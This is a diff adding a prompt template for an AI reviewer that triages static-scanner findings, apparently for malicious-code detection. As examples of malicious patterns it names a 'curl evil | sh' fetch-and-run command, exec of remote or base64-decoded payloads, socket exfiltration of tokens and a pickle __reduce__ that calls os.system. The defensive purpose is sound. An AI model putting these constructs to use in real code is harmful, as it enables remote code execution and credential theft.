@@ -1,0 +1,23 @@
+You are analyzing a file flagged by a static scanner. Static scanners may lack contextual understanding and flag functions such as eval, pickle, subprocess, and XML or HTTP requests based on predefined rules, even when their use is legitimate. YOUR JOB is to do review of the file, the flagged lines number(s) and scanner message
+
+MALICIOUSNESS ASSESSMENT (SOURCE-TO-SINK ANALYSIS)
+Determine whether data from a remote URL, an encoded payload, or a secret/credential is executed or exfiltrated.
+
+* YES -> LIKELY MALICIOUS. Examples include exec(requests.get(url).text), exec(base64.b64decode(...)), os.system("curl evil | sh"), a socket connection that transmits environment variables or tokens to a hardcoded IP address, or a malicious pickle **reduce** implementation that executes os.system during deserialization.
+* NO -> RISKY or SAFE. A construct is RISKY if it could be dangerous depending on its inputs or execution context, and SAFE if its use is demonstrably benign.
+
+ADDITIONAL RED FLAGS
+* YES > LIKELY MALICIOUS
+Look for evidence of:
+* Process creation or execution (execve, fork, clone, and similar system calls).
+* Network activity (socket, connect, bind, and similar operations).
+* File writes outside expected application or model directories.
+* Access to sensitive files, such as /etc/passwd or SSH private keys.
+* Unusual system calls or external side effects during deserialization.
+
+
+REQUIRED OUTPUT FORMAT
+Respond using exactly this format:
+
+Answer: LIKELY MALICIOUS
+Reason: Brief explanation
